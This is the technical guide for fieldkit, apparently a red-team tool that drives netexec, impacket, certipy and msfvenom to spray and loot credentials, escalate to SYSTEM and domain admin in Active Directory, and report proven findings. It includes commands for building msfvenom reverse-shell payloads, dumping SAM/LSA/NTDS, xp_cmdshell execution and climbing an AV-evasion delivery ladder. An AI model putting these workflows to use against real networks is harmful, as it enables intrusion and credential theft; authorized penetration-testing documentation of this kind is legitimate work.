# fieldkit — technical guide

The deep reference. For the one-page runbook see **`QUICKSTART.md`**; for the visual map,
**`WORKFLOW.md`**. Architecture/dev notes live in **`CLAUDE.md`**.

**Authorized engagements only.** Every command that touches a target is captured and gated.

---

## 1. What fieldkit is

A **stateful internal-AD execution engine**. From one credential or foothold it drives
your *existing* tools (netexec/nxc, impacket, evil-winrm, certipy) against a scope, runs
the credential loop, escalates, and reports only what it actually proved. Standalone —
Python 3 **stdlib only**; the offensive tooling is yours, on `$PATH`.

Five load-bearing ideas:

- **Agent-less — it drives tools.** fieldkit never reimplements a protocol; it renders the
  right argv for nxc/impacket/certipy and reads what they relay back.
- **One store, everything is a projection.** All state is one SQLite DB (`./engagement.db`).
  `analyze` ranks what the store proves; `report` renders the captured evidence. Stop and
  resume anywhere; re-running overwrites rather than duplicating.
- **Capture everything.** Every command run against a target goes through the executor,
  which writes the verbatim command + output + exit code to the `step` table. This is why
  the report's anti-fabrication check passes *by construction*.
- **Safety gate.** Actions declare a blast radius (`read-only < config-change < crash-risk`);
  the executor admits only what you authorized (`--allow`). Read-only runs freely.
- **Assume-caught.** Evasion is a ranking axis: every technique is red until a fresh
  Defender-lab result greens it.

## 2. Install & invocation

```bash
bin/fieldkit <command>        # shim for `python3 -m fieldkit` from a clone
python3 -m fieldkit <command>
```

The DB is `./engagement.db` by default; override with `--db <path>` or `$FIELDKIT_DB`.
Other env: `$FIELDKIT_ARSENAL` (staged tools dir, default `<repo>/exploits`),
`$FIELDKIT_BUILD` (where `poc` writes, default `~/.fieldkit/build`).

## 3. Setup & config

```bash
fieldkit init "ACME Corp"
fieldkit config set lhost=10.10.14.9 lport=443 domain=corp.local
fieldkit config show | get <key> | unset <key>
```

Config keys that matter:

| key | used by |
|---|---|
| `lhost` / `lport` | `poc` reverse-shell payloads |
| `domain` | AD commands (roast/delegation/adcs), cred rendering |
| `client` / `assessor` | report header |
| `lab_host` | `lab test` (the Defender lab) |
| `stage_win` / `stage_lin` | where vectors stage artifacts on the target (default `C:\Windows\Temp` / `/tmp`) |
| `arch` | `poc` default arch (`x64`/`x86`) |

Per-subnet `lhost` overrides are supported (set/unset a subnet key) so a multi-segment
engagement uses the right callback per host.

## 4. Scope

```bash
fieldkit add hosts 10.0.0.7 WS02 --dc          # a single IP (+ optional name, DC flag)
fieldkit add hosts 10.0.0.0/24                 # a CIDR range (expanded)
fieldkit add hosts scope.txt                   # a file: IPs + CIDRs + # comments
fieldkit add hosts 10.0.0.8 --os linux         # force OS when there's no banner
```

`--dc` marks a domain controller (used by AD commands and `dc-takeover`). `--os` sets the
OS when spray can't infer it. `--max-expand` caps CIDR expansion. Hosts dedupe on IP;
re-adding enriches, never erases. OS is normally inferred from the spray banner — and, for
banner-less footholds, from the protocol that authed (**ssh→linux, smb/winrm/rdp/mssql→windows**).

## 5. Credentials

```bash
fieldkit add cred 'corp.local/jdoe:Winter2025!'      # DOMAIN/user:pass
fieldkit add cred 'CORP\svc:pw'                       # DOMAIN\user
fieldkit add cred 'user@corp.local:pw'               # UPN
fieldkit add cred 'Administrator:aad3b...:31d6c...'  # user:LM:NT hash
fieldkit add cred --user sa --password pw --local    # explicit flags (SQL login)
fieldkit add cred --from-file creds.txt              # one spec per line
```

Also accepts `:NT` (empty LM), a secretsdump line, and ccache/ssh-key paths (`--ccache`,
`--ssh-key`, `--aes`). `--local` marks a local (non-domain) account. Credentials are the
canonical model: liberal parse in, strict per-tool renderers out (`render_nxc` /
`render_impacket` / …) — fieldkit never builds a shell string.

## 6. The credential loop

```bash
fieldkit spray smb                 # the default proto; also winrm ssh rdp mssql ldap ftp
fieldkit spray smb --subnet 10.0.0.0/24 --no-loot --no-policy --timeout 30
fieldkit ingest nxc run.log        # fold a prior netexec capture into state
```

What `spray` does, per round:

1. Reads the domain password policy first (unless `--no-policy`) — the **lockout-safety**
   input. It fires at most the safe number of guesses per account per window, and it only
   ever replays **each account's own proven secret**, so it *cannot* lock a domain account.
2. Sprays every stored credential across the scope on one protocol; records who is valid
   and who is admin (`(Pwn3d!)`).
3. On every owned (admin) host, **loots** SAM + LSA (and NTDS on a DC), unless `--no-loot`.
4. **Promotes** recovered secrets to credentials and re-sprays them — repeating until a
   round finds nothing new (**until dry**).

`ingest nxc` is the same fold without spraying — feed it a capture you already have.

## 7. Transports (how commands reach a host)

Command execution rides a transport chosen from what you've **proven** works on the host:

| transport | proto | needs admin | how |
|---|---|---|---|
| `winrm` / `winrm-ps` | winrm | no | quiet, no on-disk service |
| `ssh` | ssh | no | Linux |
| `smb` / `smb-ps` | smb | yes | loud, drops a service |
| `mssql` | mssql | yes (sysadmin) | **xp_cmdshell** as the SQL service account |

`transport.select` picks the **least-privileged proven** path (ties break by a rank that
sinks loud ones). File push (`--put-file`, used by auto-stage/build) rides **smb/ssh**.

### The MSSQL path

A sysadmin MSSQL login (`spray mssql` → `Pwn3d!`) is a real foothold: the `mssql` transport
runs OS commands via **xp_cmdshell** as the SQL service account — commonly a service account
holding **SeImpersonate**. So `enum` then `escalate` chain straight to SYSTEM (Potato). It's
loud (enables xp_cmdshell, event-logged) so it ranks below SMB. `analyze` surfaces it as the
`mssql-exec` opportunity. *Getting* sysadmin from a low-privileged login (linked-server hops,
`EXECUTE AS` impersonation) is a further increment not yet automated — it needs an MSSQL-instance
enum to drive.

## 8. enum

```bash
fieldkit enum 10.0.0.7            # runs the OS-appropriate read-only plan, captured
```

Picks a Windows or Linux plan from the host OS and runs each check over the proven transport:

- **Windows:** `whoami /priv` (privileges), `whoami /groups`, AlwaysInstallElevated reg
  query, `wmic service` (unquoted paths + names), and a `svcperms` PowerShell check
  (`sc sdshow` + `icacls` → reconfigurable / writable service binaries and dirs).
- **Linux:** `id`, `sudo -n -l`, SUID sweep, `getcap`, `uname`.

A check whose shell has no proven transport (e.g. the PowerShell `svcperms` check over an
xp_cmdshell-only MSSQL foothold) is **skipped, not fatal**; enum aborts only if nothing ran.
The captured evidence is reparsed into `HostFacts` on demand — enum is idempotent.

## 9. analyze

```bash
fieldkit analyze [--proof]
```

Ranks every next move the store justifies, best first, on **three axes** — exploitability,
safety, detection — via `kb.score`. Opportunities are loop-level (DC takeover, password
reuse, PtH, unlooted admin, MSSQL exec, foothold-enum, roastable loot, ADCS, delegation,
BloodHound paths) plus every privesc **vector** enum unlocked. `--proof` shows the safe way
to evidence each. analyze never invents a move — each is backed by a real access/credential/
enum fact.

## 10. run vs escalate — the orchestrator

```bash
fieldkit run 10.0.0.7 seimpersonate:native --allow config-change   # fire ONE named vector
fieldkit escalate 10.0.0.7 --allow config-change                   # walk the ranked vectors
fieldkit escalate 10.0.0.7 --dry-run | --rules | --max N | --no-stage
```

`run` fires one vector by hand. `escalate` is the **orchestrator**: it fires the best-ranked
vector, classifies the captured output into a `Verdict`, and follows the **fallback axis**:

| verdict | axis → action |
|---|---|
| proved (elevation marker) | **stop** — record the finding |
| denied / ran-no-proof | **advance** to the next vector |
| timed out | **retry** once, then advance |
| unrecognized output | **surface** — halt and show you the raw output |
| caught by AV | **re-deliver** — mark the delivery red, climb the ladder (§12) |
| tool missing | **auto-stage** from the arsenal, then re-fire (§11) |
| payload missing | **auto-build** via `poc`, stage, re-fire (§11) |
| wrong image (bad arch) | **rebuild** corrected once, re-fire |
| manual route | **hand off** to `prep` (§13) — never auto-fired |

`escalate --rules` prints this policy table. The classifier is an inspectable ruleset over
tool output (`classify.py`) — structural signals first (exit code, timeout, tool-missing),
then a readable signature list. Every proven finding **links its captured step**, so
`report --check` passes.

**Safety gate:** read-only vectors run after a confirm; `config-change` / `crash-risk` need
an explicit `--allow config-change` (and/or `--allow crash-risk`). A vector above the
authorized blast radius is *skipped, never fired*. `--max` caps how many vectors touch the
target (default 12); `--dry-run` prints the plan and fires nothing.

## 11. Auto-provision (stage / build / rebuild)

When a vector fails because the artifact it needs isn't on the target, the loop provisions it
and re-fires — once per vector, within budget:

- **auto-stage** — the vector declares an arsenal artifact (e.g. `GodPotato`); the loop pushes
  it via `--put-file` and retries.
- **auto-build** — the vector declares a built artifact (e.g. an AlwaysInstallElevated `.msi`);
  the loop builds it with `poc` (§14), stages it, retries.
- **rebuild** — a `bad_build` (wrong arch/.NET) rebuilds corrected once.
- **build-error** (the builder itself failed) advances — fix the toolchain (`poc --check`).

`--no-stage` disables all of it (advance on a miss instead).

## 12. Evasion (assume-caught + the delivery ladder)

```bash
fieldkit posture              # the green/red matrix + recommended delivery order
fieldkit lab test             # prove techniques against a Defender lab (config lab_host)
```

Every technique is **red until a fresh lab result greens it** (greens go stale after 14 days).
`posture` shows the matrix and the recommended delivery order (quiet native no-AMSI paths above
AMSI-scanned scripts and the loud installer). In `escalate`, an objective reached by several
tools is a **delivery ladder** (native-exe → in-memory → script). A delivery caught by AV is
recorded **red live**, and the loop climbs to the next method in posture order; a delivery
already known-caught is skipped without firing.

## 13. Manual routes (prep)

Some routes can't be one-shot proven — overwriting a *running* service binary (file-locked) or
planting a hijack DLL (needs a Procmon-found name). fieldkit builds the artifact and hands you
the placement steps:

```bash
fieldkit prep 10.0.0.7 writablesvc:Spooler          # build + print placement + steps
fieldkit prep 10.0.0.7 writablesvc:Spooler --stage  # also upload it to the stage dir
```

`escalate` surfaces these (never fires them) and points at `prep`. The output is: the built
artifact's local path, where to place it on the target, the ordered operator steps, and the
restore command.

## 14. poc (the build layer)

```bash
fieldkit poc --check                                   # which builders are installed
fieldkit poc msi -o evil.msi                           # drive wixl
fieldkit poc exe --lhost 10.10.14.9 --lport 443 -o r.exe  # msfvenom reverse shell
fieldkit poc dll --source loader.c                     # compile your own with mingw
```

Formats: `exe`/`dll`/`ps1` (msfvenom, or mingw from `--source`), `msi` (wixl), `so` (gcc).
**Orchestration only** — fieldkit drives the operator's builders and templates benign
scaffolding (a WiX `.wxs`, a `.c` that runs a command); the actual payload bytes come from
msfvenom or your `--source`. By default it builds a `whoami`/`id` **proof** artifact;
`--lhost/--lport` switch msfvenom to a reverse shell. `arsenal.resolve()` reports a BUILD
route ready only when its builder is on `$PATH`.

## 15. AD depth

```bash
fieldkit roast --dc 10.0.0.10 [--kind kerberoast|asrep|both]   # roast → crackable loot
fieldkit delegation --dc 10.0.0.10                             # unconstrained/constrained/RBCD
fieldkit adcs find --dc 10.0.0.10                              # certipy ESC1-16
fieldkit bloodhound import ./bh/                               # SharpHound → owned→DA paths
```

Each records findings/loot and feeds `analyze`. The loop closes: `roast` → crack offline →
`add cred` the cracked secret → `spray` again.

## 16. arsenal

```bash
fieldkit arsenal list | check | find <name> | rules
```

What tools/exploits are staged (`$FIELDKIT_ARSENAL`), and per route whether it's ready,
needs a fetch, or needs a build. `arsenal rules` prints the classifier's signature list.

## 17. Reporting

```bash
fieldkit report --check                              # anti-fabrication gate (exit 2 on errors)
fieldkit report --formats md,docx,pdf -o report      # the customer report
fieldkit report --proven-only -o report              # Findings only (tight deliverable)
fieldkit report --cleanup -o report                  # INTERNAL revert manifest
```

The report separates two deliberately distinct results, and **includes both by default**:

- **Findings** — weaknesses **proved by exploiting them**: a full technical walkthrough
  (verbatim command + captured output), a "Proof of compromise" callout, screenshot
  placeholders, and remediation. A demonstrated compromise.
- **Observations** — weaknesses **identified but not exploited**: "Potential impact (if
  exploited)" and "How to confirm", never a proof-of-compromise. Real but unconfirmed.

`--proven-only` drops the Observations. `report --check` is the **anti-fabrication** gate:
a *proven* finding without its captured command+output is an error (an Observation has no
PoC to check). `--cleanup` writes the internal artifact-removal manifest (proven findings
only — Observations changed nothing); do not send it to the client. `--force` renders past
check errors. Severity/CWE/description/remediation are auto-filled from the KB (~80
`vector_type`s) so a finding records → renders → bridges with no hand-mapping. DOCX/PDF need
`pandoc` (+ `weasyprint` for PDF).

## 18. recce integration

```bash
fieldkit export-recce recce.json      # proven findings → recce fieldkit-import JSON
```

Emits a pinned contract (`{"_recce_import":1, "source":"fieldkit", "findings":[…, "_recce":
{ip,hostname,port,severity,cwe,remediation,confidence:"confirmed",…}]}`). Pairs with the recce
triage tool — `recce fieldkit-export` seeds triage, `recce fieldkit-import` folds findings back.

## 19. Safety model & rules of engagement

- **Three tiers.** `read-only` (enum, DCSync a throwaway) runs freely; `config-change`
  (drop a payload, reconfigure a service) and `crash-risk` (kernel/BYOVD) need explicit
  `--allow`.
- **Confirm-before-write.** Anything that runs a tool against the client confirms first
  (`--yes` / `-y` to skip in a non-interactive run — fieldkit *refuses to guess* on a
  non-TTY without it).
- **Cleanup is a manifest, not memory.** Every change an action makes is recorded as a
  cleanup artifact the moment it runs; `report --cleanup` is the revert checklist.
- **Assume-caught** governs evasion; **anti-fabrication** governs the report.

## 20. Extending fieldkit

- **A privesc technique** → one entry in `privesc.GTFO`/`CAPS`/`WIN_PRIVS` or a driver in
  `privesc.DRIVERS`; set `report_type` to a `reportkb.KB` key.
- **An analyze opportunity** → append a predicate to `kb.PREDICATES` (reads store, yields
  `Opportunity`).
- **An auto-provisioned artifact** → give a `Vector` `stages=((name,remote),)` or
  `builds=((fmt,remote,cmd),)`. New build format → one entry in `poc.RECIPES`/`poc.BUILDER`.
- **A manual route** → set `Vector.playbook = Playbook(...)`; `prep` renders it.
- **An evasion technique** → a row in `evasion.TECHNIQUES` (+ a `lab.PROBES` probe).
- **A report vector** → a `reportkb.KB` entry (+ `RISK`).
- **A transport** → a row in `transport.TRANSPORTS` (like the MSSQL one).

## 21. Troubleshooting

| symptom | cause / fix |
|---|---|
| `OS unknown — cannot pick an enum plan` | no banner set the OS; `add hosts <ip> --os windows\|linux` |
| `no proven way to run a … / no credential is proven` | spray/validate a usable protocol on the host first |
| `… blocked by the safety gate` | the vector is config-change/crash-risk — add `--allow` |
| `<builder> for <fmt> is not installed` | `poc --check`; install msfvenom/wixl/gcc/mingw |
| escalate halts on `surface` | the classifier didn't recognize the output — inspect it (`arsenal rules`) |
| escalate stops on `budget` | raise `--max` |
| `refusing to render: … anti-fabrication error` | a *proven* finding lacks its step — re-prove it, or `--force` |

## 22. Known limitations

- MSSQL is a **sysadmin → OS-exec** path; low-priv→sysadmin (linked-server / impersonation)
  isn't automated yet.
- `rdp` / `ldap` / `ftp` protocols **validate creds** but aren't execution transports.
- DLL-hijack `prep` needs you to supply the hijackable DLL name (Procmon).
- `poc` orchestrates external builders — it does **not** embed shellcode / AMSI-bypass /
  working implants; those come from msfvenom or your `--source`.
